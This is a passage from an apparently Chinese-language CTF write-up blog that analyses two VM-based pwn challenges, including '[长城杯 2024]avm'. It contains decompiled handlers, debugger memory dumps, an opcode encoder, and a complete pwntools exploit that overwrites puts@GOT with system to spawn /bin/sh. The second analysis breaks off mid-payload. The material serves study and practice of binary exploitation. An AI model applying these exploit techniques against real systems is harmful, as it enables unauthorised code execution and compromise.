&amp;&amp; (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)get_value(a1, &amp;v3) )<br>    <span class="hljs-keyword">return</span> write_value(a1, v2 / v3);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>除法，类似 add，top–</p><p>load</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">sub_401CCE</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  __int64 v2; <span class="hljs-comment">// [rsp+10h] [rbp-10h] BYREF</span><br><br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)get_value(a1, &amp;v2) )       <span class="hljs-comment">// 从stack顶部取出的数作为偏移</span><br>    <span class="hljs-keyword">return</span> write_value(a1, *(_QWORD *)(*(_QWORD *)a1 + <span class="hljs-number">8</span> * (*(<span class="hljs-type">int</span> *)(a1 + <span class="hljs-number">12</span>) + v2)));<span class="hljs-comment">// 将该偏移处的数写入栈顶</span><br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>仅支持一个参数：stack，作用是从 stack 尾部取出一个数作为偏移 (v2)，接着将 top+v2 处的地址写入 stack 里，top 值不变</p><p>由于对偏移没有限制，我们可以取出任意地址的数据</p><p>save</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">sub_401D37</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  __int64 v2; <span class="hljs-comment">// [rsp+10h] [rbp-10h] BYREF</span><br>  __int64 v3; <span class="hljs-comment">// [rsp+18h] [rbp-8h] BYREF</span><br><br>  <span class="hljs-keyword">if</span> ( !(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)get_value(a1, &amp;v2) || !(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)get_value(a1, &amp;v3) )<span class="hljs-comment">// 从stack上取出两个数作为v2和v3</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  *(_QWORD *)(<span class="hljs-number">8</span> * (*(<span class="hljs-type">int</span> *)(a1 + <span class="hljs-number">12</span>) + v2) + *(_QWORD *)a1) = v3;<span class="hljs-comment">// 以stack为底，将v3写到v2偏移处</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>从 stack 尾部取出两个数，分别为 v2, v3，以 top+v2 作为偏移，将 v3 写入到该地址处，top-&#x3D;2</p><p>由于对 v2 值没有限制，可以将 stack 上数据写入任意地址</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>由于 got 表是 Partial RELRO，main 函数里还有一个 puts(name)，我们可以将 name 输入成 &#x2F;bin&#x2F;sh\x00，然后将 puts 的 got 修改成 system，接下去调用的就是 system(“&#x2F;bin&#x2F;sh”) 了</p><ol><li>首先需要将stack迁移到got表附近，具体操作是利用save函数将stack的指针修改到got表附近</li></ol><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0x404020</span> &lt;puts@got.plt&gt;:<span class="hljs-number">0</span>x00000<span class="hljs-number">00000401046</span><span class="hljs-number">0</span>x00000<span class="hljs-number">00000401056</span><br><span class="hljs-number">0x404030</span> &lt;printf@got.plt&gt;:<span class="hljs-number">0</span>x00000<span class="hljs-number">00000401066</span><span class="hljs-number">0</span>x00007ffff<span class="hljs-number">7972970</span><br><span class="hljs-number">0x404040</span> &lt;alarm@got.plt&gt;:<span class="hljs-number">0</span>x00007ffff78cc200<span class="hljs-number">0</span>x00000<span class="hljs-number">00000401096</span><br><span class="hljs-number">0x404050</span> &lt;strcmp@got.plt&gt;:<span class="hljs-number">0</span>x000000<span class="hljs-number">00004010a6</span><span class="hljs-number">0</span>x00007ffff<span class="hljs-number">7884130</span><br><span class="hljs-number">0x404060</span> &lt;setvbuf@got.plt&gt;:<span class="hljs-number">0</span>x00007ffff786fe70<span class="hljs-number">0</span>x000000<span class="hljs-number">00004010d6</span><br><span class="hljs-number">0x404070</span> &lt;strtok@got.plt&gt;:<span class="hljs-number">0</span>x000000<span class="hljs-number">00004010e6</span><span class="hljs-number">0</span>x000000<span class="hljs-number">00004010f6</span><br><span class="hljs-number">0x404080</span> &lt;exit@got.plt&gt;:<span class="hljs-number">0</span>x0000<span class="hljs-number">000000401106</span><span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x404090</span>:<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><span class="hljs-number">0</span>x00000<span class="hljs-number">00000402004</span><br><span class="hljs-number">0x4040a0</span> &lt;stdout&gt;:<span class="hljs-number">0</span>x00007ffff7bc5620<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x4040b0</span> &lt;stdin&gt;:<span class="hljs-number">0</span>x00007ffff7bc48e0<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x4040c0</span> &lt;stderr&gt;:<span class="hljs-number">0</span>x00007ffff7bc5540<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x4040d0</span>:<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x4040e0</span>:<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><ul><li>我们可以修改为0x4040d0</li><li>具体</li></ul><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-keyword">push</span> <span class="hljs-keyword">push</span> <span class="hljs-keyword">save</span><br><span class="hljs-number">0x4040d0</span> <span class="hljs-number">-3</span><br></code></pre></td></tr></table></figure><ul><li>两个 push 将 0x4040d0 和 -3 压入 stack 中，此时 top 值为1，索引为-3</li><li>然后 save 两个 get_value 后top变为-1</li><li>接着索引 -1+(-3)&#x3D;-4 刚好就是记录 stack 指针的位置，就可以将 0x4040d0写进去</li></ul><p><img src="/2025/05/19/IO_FILE%20Exploit/6613.png"></p><p>操作结束 top&#x3D;-1</p><p>接着读取 puts_got 的值</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-keyword">push</span> <span class="hljs-keyword">load</span><br><span class="hljs-number">-21</span><br></code></pre></td></tr></table></figure><p>由于此时 top&#x3D;-1，加上 -21 就是 -22 也就是 puts_got 的索引，这样就可以将puts_got 写到当前 stack</p><p><img src="/2025/05/19/IO_FILE%20Exploit/2853.png"></p><p>操作完 top&#x3D;0</p><p>然后需要加上 puts_got 和 system 之间的偏移，就可以得到 system 地址</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">push</span> add<br>-<span class="hljs-built_in">offset</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/19/IO_FILE%20Exploit/3130.png"></p><p><img src="/2025/05/19/IO_FILE%20Exploit/5136.png"></p><p>此时 top&#x3D;0</p><p>然后将该地址写到 puts_got 即可</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-keyword">push</span> <span class="hljs-keyword">save</span><br><span class="hljs-number">-21</span><br></code></pre></td></tr></table></figure><p>由于 save 会两次 get_value 会让 top-&#x3D;2 变为 -1，所以偏移还是 -21 即可</p><p>效果：</p><p><img src="/2025/05/19/IO_FILE%20Exploit/5323.png"></p><p>接着运行就可以得到 flag 了</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>r=process(<span class="hljs-string">&#x27;./vm2&#x27;</span>)<br><span class="hljs-comment"># r=remote(&quot;node5.buuoj.cn&quot;,27721)</span><br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&quot;Your program name:\n&quot;</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&quot;Your instruction:\n&quot;</span>,<span class="hljs-string">b&#x27;push push save push load push add push save&#x27;</span>)<br>offset=libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]-libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(offset))<br>pause()<br>r.sendlineafter(<span class="hljs-string">&quot;Your stack data:\n&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x4040d0</span>)+<span class="hljs-string">&quot; &quot;</span>+<span class="hljs-built_in">str</span>(-<span class="hljs-number">3</span>)+<span class="hljs-string">&quot; &quot;</span>+<span class="hljs-built_in">str</span>(-<span class="hljs-number">21</span>)+<span class="hljs-string">&quot; &quot;</span>+<span class="hljs-built_in">str</span>(-offset)+<span class="hljs-string">&quot; &quot;</span>+<span class="hljs-built_in">str</span>(-<span class="hljs-number">21</span>))<br>r.interactive()<br>pause()<br><br></code></pre></td></tr></table></figure><h1 id="长城杯-2024-avm"><a href="#长城杯-2024-avm" class="headerlink" title="[长城杯 2024]avm"></a>[长城杯 2024]avm</h1><h2 id="checksec-2"><a href="#checksec-2" class="headerlink" title="checksec"></a>checksec</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs scss">yyyffff<span class="hljs-keyword">@yyyffff-virtual-machine</span>:~/桌面/avm$ checksec pwn<br>[*] <span class="hljs-string">&#x27;/home/yyyffff/桌面/avm/pwn&#x27;</span><br>    <span class="hljs-attribute">Arch</span>:       amd64-<span class="hljs-number">64</span>-little<br>    <span class="hljs-attribute">RELRO</span>:      Full RELRO<br>    <span class="hljs-attribute">Stack</span>:      Canary found<br>    <span class="hljs-attribute">NX</span>:         NX enabled<br>    <span class="hljs-attribute">PIE</span>:        PIE enabled<br>    <span class="hljs-attribute">SHSTK</span>:      Enabled<br>    <span class="hljs-attribute">IBT</span>:        Enabled<br></code></pre></td></tr></table></figure><h2 id="IDA-2"><a href="#IDA-2" class="headerlink" title="IDA"></a>IDA</h2><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">3080</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-C10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v5; <span class="hljs-comment">// [rsp+C08h] [rbp-8h]</span><br><br>  v5 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  sub_11E9();<br>  <span class="hljs-built_in">memset</span>(s, <span class="hljs-number">0</span>, <span class="hljs-number">0x300u</span>LL);<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;opcode: &quot;</span>, <span class="hljs-number">8uLL</span>);<br>  read(<span class="hljs-number">0</span>, s, <span class="hljs-number">0x300u</span>LL);<br>  sub_1230(qword_40C0, (__int64)s, <span class="hljs-number">768LL</span>);<br>  sub_19F1(qword_40C0);<br>  <span class="hljs-keyword">return</span> v5 - __readfsqword(<span class="hljs-number">0x28u</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到是输入opcode到s里面</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">_QWORD *__fastcall <span class="hljs-title function_">sub_1230</span><span class="hljs-params">(_QWORD *a1, __int64 a2, __int64 a3)</span><br>&#123;<br>  _QWORD *result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+24h] [rbp-4h]</span><br><br>  a1[<span class="hljs-number">33</span>] = a2;<br>  a1[<span class="hljs-number">34</span>] = a3;<br>  result = a1;<br>  a1[<span class="hljs-number">32</span>] = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">31</span>; ++i )<br>  &#123;<br>    result = a1;<br>    a1[i] = <span class="hljs-number">0LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>a1就是 main 函数里的 qword_40c0，一个bss段中的地址</p><p>a1[33] 改为输入的 opcode</p><p>a1[34]改为 768（可能是作为指令的最大长度，具体作用不清楚）</p><p>a1[32]改为0，这个是指令计数器，后面具体操作中会自增</p><p>接着将 a1[0~31] 全改成0，这是自己定义的寄存器</p><p>所以我们可以重新用IDA定义一个结构体，后文会看的更清晰</p><p>View-&gt;Open subviews-&gt;Local types-&gt;空白区域右键-&gt;Inseart-&gt;</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_ctx</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">uint64_t</span> regs[<span class="hljs-number">32</span>];<br>  <span class="hljs-type">uint64_t</span> pc;<br>  <span class="hljs-type">uint64_t</span> code_base;<br>  <span class="hljs-type">uint64_t</span> code_size;<br>&#125;;<br></code></pre></td></tr></table></figure><p>然后在每一个有用到该指针的地方按Y-&gt;输入vm_ctx-&gt;\n即可</p><p>继续看 main 函数里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">sub_19F1</span><span class="hljs-params">(vm_ctx *a1)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+1Ch] [rbp-114h]</span><br>  <span class="hljs-type">char</span> s[<span class="hljs-number">264</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-110h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+128h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  <span class="hljs-built_in">memset</span>(s, <span class="hljs-number">0</span>, <span class="hljs-number">0x100u</span>LL);<br>  <span class="hljs-keyword">while</span> ( a1-&gt;pc &lt; a1-&gt;code_size )<br>  &#123;<br>    v2 = *(_DWORD *)(a1-&gt;code_base + (a1-&gt;pc &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFFCL</span>L)) &gt;&gt; <span class="hljs-number">28</span>;<span class="hljs-comment">// 拆解opcode</span><br>    <span class="hljs-keyword">if</span> ( v2 &gt; <span class="hljs-number">0xA</span> || !v2 )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Unsupported instruction&quot;</span>);<br>      <span class="hljs-keyword">return</span> v4 - __readfsqword(<span class="hljs-number">0x28u</span>);<br>    &#125;<br>    ((<span class="hljs-type">void</span> (__fastcall *)(vm_ctx *, <span class="hljs-type">char</span> *))funcs_1AAD[v2])(a1, s);<span class="hljs-comment">// 执行对应的操作</span><br>  &#125;<br>  <span class="hljs-keyword">return</span> v4 - __readfsqword(<span class="hljs-number">0x28u</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>对刚才的 opcode 进行分析，指令基部加上指令计数器后 &gt;&gt;28（取最高位，比如 0x12345678取得就是 0x1）</p><p>然后根据取出来的不同结果，去进行不同的操作</p><p><img src="/2025/05/19/IO_FILE%20Exploit/4314.png"></p><p>下面对这些函数分析</p><h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">vm_ctx *__fastcall <span class="hljs-title function_">add</span><span class="hljs-params">(vm_ctx *a1)</span><br>&#123;<br>  vm_ctx *result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br><br>  v2 = *(_DWORD *)(a1-&gt;code_base + (a1-&gt;pc &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFFCL</span>L));<br>  a1-&gt;pc += <span class="hljs-number">4LL</span>;                                <span class="hljs-comment">// 指令寄存器+4</span><br>  result = a1;<br>  a1-&gt;regs[v2 &amp; <span class="hljs-number">0x1F</span>] = a1-&gt;regs[HIWORD(v2) &amp; <span class="hljs-number">0x1F</span>] + a1-&gt;regs[(v2 &gt;&gt; <span class="hljs-number">5</span>) &amp; <span class="hljs-number">0x1F</span>];<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先取出指令</p><p>指令寄存器 +4，说明每一条指令是 4 字节，也就是 8 位 16 进制数，也就是 p32</p><p>根据加法运算可以推测</p><ul><li>v2&amp;0x1f 是目标寄存器，其中 v2&amp;0x1f 是取操作数的最后 5 位，</li><li>HIWORD(v2)&amp;0x1f 是取高两个字节的最后 5 位，作为操作数 1</li><li>(v2&gt;&gt;5)&amp;0x1f 是取第 5-9 位，作为操作数 2</li></ul><p>所以我们可以写出生成 opcode 的函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">opcode</span>(<span class="hljs-params">op, dst, src1, src2</span>):<br>    instr = ((op ) &lt;&lt; <span class="hljs-number">28</span>)+((src1) &lt;&lt; <span class="hljs-number">16</span>)+((src2 ) &lt;&lt; <span class="hljs-number">5</span>)+(dst )<br>    <span class="hljs-keyword">return</span> instr<br></code></pre></td></tr></table></figure><p>下面 7 种操作跟 add 完全一样，只不过 + 号被换成对应的符号了，所以直接来看 0x9 和 0xa 的操作</p><h3 id="sub-175D"><a href="#sub-175D" class="headerlink" title="sub_175D"></a>sub_175D</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">sub_175D</span><span class="hljs-params">(vm_ctx *a1, __int64 a2)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int64 result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+20h] [rbp-20h]</span><br>  _QWORD *v4; <span class="hljs-comment">// [rsp+30h] [rbp-10h]</span><br><br>  v3 = *(_DWORD *)(a1-&gt;code_base + (a1-&gt;pc &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFFCL</span>L));<span class="hljs-comment">// 取出的opcode</span><br>  a1-&gt;pc += <span class="hljs-number">4LL</span>;<br>  result = (<span class="hljs-type">unsigned</span> __int8)byte_4010;          <span class="hljs-comment">// 0xff</span><br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)(a1-&gt;regs[(v3 &gt;&gt; <span class="hljs-number">5</span>) &amp; <span class="hljs-number">0x1F</span>] + BYTE2(v3)) &lt; (<span class="hljs-type">unsigned</span> __int8)byte_4010 )<span class="hljs-comment">// 貌似没啥用</span><br>  &#123;<br>    v4 = (_QWORD *)((<span class="hljs-type">unsigned</span> __int16)(a1-&gt;regs[(v3 &gt;&gt; <span class="hljs-number">5</span>) &amp; <span class="hljs-number">0x1F</span>] + (HIWORD(v3) &amp; <span class="hljs-number">0xFFF</span>)) + a2);<br>    *v4 = a1-&gt;regs[v3 &amp; <span class="hljs-number">0x1F</span>];<br>    <span class="hljs-keyword">return</span> (<span class="hljs-type">unsigned</span> __int64)v4;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中 result&#x3D;0xff 作为下面 if 的依据，不过 8 位的 unsigned int 最大也就是 0xff，所以这里的 if 语句不必理会</p><p>该函数作用就是向栈（系统给的）上写入数据</p><ul><li>取(unsigned __int16)(a1-&gt;regs[(v3 &gt;&gt; 5) &amp; 0x1F] + (HIWORD(v3) &amp; 0xFFF)) + a2 作为写入的地址<ul><li>其中 a1-&gt;regs[(v3 &gt;&gt; 5) &amp; 0x1F] 我们可以直接将其设为0，比如用 a1-&gt;regs[30]（最开始初始化将所有寄存器都设为0）</li><li>HIWORD(v3) &amp; 0xFFF 就是高字节的后 12 位 （比如0x12345678对应的就是0x234），我们直接用这个来控制偏移，发现该数我们可以直接用 src1来控制，因为操作码不会超过 0xA，后三个16进制数完全由 src1 控制，比如 opcode(10,2,0x160,30) 就会令该数为 0x160</li><li>a2 是传进来的栈上的地址</li></ul></li><li>然后往该地址处写入 a1-&gt;regs[v3 &amp; 0x1F] 就是 regs[dst]</li></ul><h3 id="sub-189B"><a href="#sub-189B" class="headerlink" title="sub_189B"></a>sub_189B</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">vm_ctx *__fastcall <span class="hljs-title function_">sub_189B</span><span class="hljs-params">(vm_ctx *a1, __int64 a2)</span><br>&#123;<br>  vm_ctx *result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">unsigned</span> __int16 v3; <span class="hljs-comment">// [rsp+1Eh] [rbp-22h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [rsp+20h] [rbp-20h]</span><br><br>  v4 = *(_DWORD *)(a1-&gt;code_base + (a1-&gt;pc &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFFCL</span>L));<br>  a1-&gt;pc += <span class="hljs-number">4LL</span>;<br>  result = (vm_ctx *)(<span class="hljs-type">unsigned</span> __int8)byte_4010;<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)(a1-&gt;regs[(v4 &gt;&gt; <span class="hljs-number">5</span>) &amp; <span class="hljs-number">0x1F</span>] + BYTE2(v4)) &lt; (<span class="hljs-type">unsigned</span> __int8)byte_4010 )<br>  &#123;<br>    result = a1;<br>    v3 = a1-&gt;regs[(v4 &gt;&gt; <span class="hljs-number">5</span>) &amp; <span class="hljs-number">0x1F</span>] + (HIWORD(v4) &amp; <span class="hljs-number">0xFFF</span>);<br>    a1-&gt;regs[v4 &amp; <span class="hljs-number">0x1F</span>] = ((<span class="hljs-type">unsigned</span> __int64)*(<span class="hljs-type">unsigned</span> __int8 *)(v3 + a2 + <span class="hljs-number">7</span>) &lt;&lt; <span class="hljs-number">56</span>) | ((<span class="hljs-type">unsigned</span> __int64)*(<span class="hljs-type">unsigned</span> __int8 *)(v3 + a2 + <span class="hljs-number">6</span>) &lt;&lt; <span class="hljs-number">48</span>) | ((<span class="hljs-type">unsigned</span> __int64)*(<span class="hljs-type">unsigned</span> __int8 *)(v3 + a2 + <span class="hljs-number">5</span>) &lt;&lt; <span class="hljs-number">40</span>) | ((<span class="hljs-type">unsigned</span> __int64)*(<span class="hljs-type">unsigned</span> __int8 *)(v3 + a2 + <span class="hljs-number">4</span>) &lt;&lt; <span class="hljs-number">32</span>) | ((<span class="hljs-type">unsigned</span> __int64)*(<span class="hljs-type">unsigned</span> __int8 *)(v3 + a2 + <span class="hljs-number">3</span>) &lt;&lt; <span class="hljs-number">24</span>) | ((<span class="hljs-type">unsigned</span> __int64)*(<span class="hljs-type">unsigned</span> __int8 *)(v3 + a2 + <span class="hljs-number">2</span>) &lt;&lt; <span class="hljs-number">16</span>) | *(<span class="hljs-type">unsigned</span> __int16 *)(v3 + a2);<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>作用跟上面的函数是反过来的，其中很多的|其实就是按字节来写入，总体上就是将一个地址上的输入写到 regs[dst] 上</p><p>if 语句跟上面函数一样，不必理会</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>跟 ret2libc 差不多，想办法泄露出 libc 基址，然后用 0x9 来写到 main 函数返回地址处即可</p><p>将断点下在</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">a1-&gt;regs[v4 &amp; <span class="hljs-number">0x1F</span>] = ((<span class="hljs-type">unsigned</span> __int64)*(<span class="hljs-type">unsigned</span> __int8 *)(v3 + a2 + <span class="hljs-number">7</span>) &lt;&lt; <span class="hljs-number">56</span>) | ((<span class="hljs-type">unsigned</span> __int64)*(<span class="hljs-type">unsigned</span> __int8 *)(v3 + a2 + <span class="hljs-number">6</span>) &lt;&lt; <span class="hljs-number">48</span>) .......<br></code></pre></td></tr></table></figure><p>观察栈上情况</p><p>发现 rsi 在 +0x30 处（rsi 作为函数的第二个参数，也就是上一层函数的栈上地址，其偏移待会儿需要减去）</p><p>而发现在 0xe08处有一个 __libc_start_main+128 的地址</p><p>确定偏移为 0xe08-0x30&#x3D;0xdd8</p><p>我们将这个地址写到 regs[1] 上</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=p32(opcode(<span class="hljs-number">10</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0xdd8</span>,<span class="hljs-number">1</span>)) <span class="hljs-comment"># 